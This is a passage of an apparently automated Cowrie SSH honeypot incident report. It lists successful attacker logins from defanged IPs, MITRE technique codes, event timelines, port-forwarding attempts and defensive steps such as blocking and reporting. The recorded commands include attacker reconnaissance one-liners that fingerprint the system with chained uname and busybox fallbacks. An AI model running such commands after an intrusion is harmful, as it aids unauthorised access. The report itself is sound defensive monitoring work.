| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:34:33` | `cowrie.session.connect` |
| `2026-09-03 11:34:33` | `cowrie.client.version` |
| `2026-09-03 11:34:33` | `cowrie.client.kex` |
| `2026-09-03 11:34:34` | `cowrie.login.success` |
| `2026-09-03 11:34:35` | `cowrie.session.params` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.success` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.command.input` |
| `2026-09-03 11:34:35` | `cowrie.log.closed` |
| `2026-09-03 11:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ba31089007

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:36 |
| **Last Seen** | 2026-09-03 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:36:01` | `cowrie.session.connect` |
| `2026-09-03 11:36:01` | `cowrie.client.version` |
| `2026-09-03 11:36:01` | `cowrie.client.kex` |
| `2026-09-03 11:36:01` | `cowrie.login.success` |
| `2026-09-03 11:36:02` | `cowrie.session.params` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.success` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.command.input` |
| `2026-09-03 11:36:02` | `cowrie.log.closed` |
| `2026-09-03 11:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47cf933e4726

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:37 |
| **Last Seen** | 2026-09-03 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:37:31` | `cowrie.session.connect` |
| `2026-09-03 11:37:31` | `cowrie.client.version` |
| `2026-09-03 11:37:31` | `cowrie.client.kex` |
| `2026-09-03 11:37:31` | `cowrie.login.success` |
| `2026-09-03 11:37:32` | `cowrie.session.params` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.success` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.command.input` |
| `2026-09-03 11:37:32` | `cowrie.log.closed` |
| `2026-09-03 11:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2825fc75ce9b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:38 |
| **Last Seen** | 2026-09-03 11:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:38:47` | `cowrie.session.connect` |
| `2026-09-03 11:38:47` | `cowrie.client.version` |
| `2026-09-03 11:38:47` | `cowrie.client.kex` |
| `2026-09-03 11:38:48` | `cowrie.login.success` |
| `2026-09-03 11:38:50` | `cowrie.session.params` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.success` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.command.input` |
| `2026-09-03 11:38:50` | `cowrie.log.closed` |
| `2026-09-03 11:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590126e4e4f7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:39 |
| **Last Seen** | 2026-09-03 11:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:39:55` | `cowrie.session.connect` |
| `2026-09-03 11:39:55` | `cowrie.client.version` |
| `2026-09-03 11:39:55` | `cowrie.client.kex` |
| `2026-09-03 11:39:56` | `cowrie.login.success` |
| `2026-09-03 11:39:57` | `cowrie.session.params` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.success` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.command.input` |
| `2026-09-03 11:39:57` | `cowrie.log.closed` |
| `2026-09-03 11:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7d844b7370

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:40 |
| **Last Seen** | 2026-09-03 11:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:40:30` | `cowrie.session.connect` |
| `2026-09-03 11:40:30` | `cowrie.client.version` |
| `2026-09-03 11:40:30` | `cowrie.client.kex` |
| `2026-09-03 11:40:30` | `cowrie.login.success` |
| `2026-09-03 11:40:31` | `cowrie.session.params` |
| `2026-09-03 11:40:31` | `cowrie.command.input` |
| `2026-09-03 11:40:31` | `cowrie.log.closed` |
| `2026-09-03 11:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5380b8f41021

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:40 |
| **Last Seen** | 2026-09-03 11:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:40:31` | `cowrie.session.connect` |
| `2026-09-03 11:40:31` | `cowrie.client.version` |
| `2026-09-03 11:40:31` | `cowrie.client.kex` |
| `2026-09-03 11:40:32` | `cowrie.login.success` |
| `2026-09-03 11:40:32` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:40:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:40:32` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc65ba606567

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:41 |
| **Last Seen** | 2026-09-03 11:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:41:06` | `cowrie.session.connect` |
| `2026-09-03 11:41:06` | `cowrie.client.version` |
| `2026-09-03 11:41:06` | `cowrie.client.kex` |
| `2026-09-03 11:41:07` | `cowrie.login.success` |
| `2026-09-03 11:41:08` | `cowrie.session.params` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.success` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.command.input` |
| `2026-09-03 11:41:08` | `cowrie.log.closed` |
| `2026-09-03 11:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf6952708cb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 11:41 |
| **Last Seen** | 2026-09-03 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:41:18` | `cowrie.session.connect` |
| `2026-09-03 11:41:18` | `cowrie.client.version` |
| `2026-09-03 11:41:18` | `cowrie.client.kex` |
| `2026-09-03 11:41:19` | `cowrie.login.success` |
| `2026-09-03 11:41:19` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:41:19` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1085e3d41123

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:41 |
| **Last Seen** | 2026-09-03 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:41:26` | `cowrie.session.connect` |
| `2026-09-03 11:41:26` | `cowrie.client.version` |
| `2026-09-03 11:41:27` | `cowrie.client.kex` |
| `2026-09-03 11:41:28` | `cowrie.login.success` |
| `2026-09-03 11:41:28` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:41:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:41:28` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d68e2fc988

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:42 |
| **Last Seen** | 2026-09-03 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:42:14` | `cowrie.session.connect` |
| `2026-09-03 11:42:14` | `cowrie.client.version` |
| `2026-09-03 11:42:14` | `cowrie.client.kex` |
| `2026-09-03 11:42:14` | `cowrie.login.success` |
| `2026-09-03 11:42:15` | `cowrie.session.params` |
| `2026-09-03 11:42:15` | `cowrie.command.input` |
| `2026-09-03 11:42:15` | `cowrie.log.closed` |
| `2026-09-03 11:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e52dfd9d0634

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:42 |
| **Last Seen** | 2026-09-03 11:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:42:22` | `cowrie.session.connect` |
| `2026-09-03 11:42:22` | `cowrie.client.version` |
| `2026-09-03 11:42:22` | `cowrie.client.kex` |
| `2026-09-03 11:42:23` | `cowrie.login.success` |
| `2026-09-03 11:42:24` | `cowrie.session.params` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.success` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.command.input` |
| `2026-09-03 11:42:24` | `cowrie.log.closed` |
| `2026-09-03 11:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63c49ea301e3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:43 |
| **Last Seen** | 2026-09-03 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:43:40` | `cowrie.session.connect` |
| `2026-09-03 11:43:40` | `cowrie.client.version` |
| `2026-09-03 11:43:40` | `cowrie.client.kex` |
| `2026-09-03 11:43:40` | `cowrie.login.success` |
| `2026-09-03 11:43:41` | `cowrie.session.params` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.success` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.command.input` |
| `2026-09-03 11:43:41` | `cowrie.log.closed` |
| `2026-09-03 11:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9df5ffbe9b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 11:43 |
| **Last Seen** | 2026-09-03 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:43:54` | `cowrie.session.connect` |
| `2026-09-03 11:43:54` | `cowrie.client.version` |
| `2026-09-03 11:43:54` | `cowrie.client.kex` |
| `2026-09-03 11:43:55` | `cowrie.login.success` |
| `2026-09-03 11:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9f277cb4cb3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 11:43 |
| **Last Seen** | 2026-09-03 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:43:54` | `cowrie.session.connect` |
| `2026-09-03 11:43:54` | `cowrie.client.version` |
| `2026-09-03 11:43:54` | `cowrie.client.kex` |
| `2026-09-03 11:43:55` | `cowrie.login.success` |
| `2026-09-03 11:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3860d079f57e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:43 |
| **Last Seen** | 2026-09-03 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:43:56` | `cowrie.session.connect` |
| `2026-09-03 11:43:56` | `cowrie.client.version` |
| `2026-09-03 11:43:56` | `cowrie.client.kex` |
| `2026-09-03 11:43:57` | `cowrie.login.success` |
| `2026-09-03 11:43:58` | `cowrie.session.params` |
| `2026-09-03 11:43:58` | `cowrie.command.input` |
| `2026-09-03 11:43:58` | `cowrie.log.closed` |
| `2026-09-03 11:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53585d423f8b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:45 |
| **Last Seen** | 2026-09-03 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

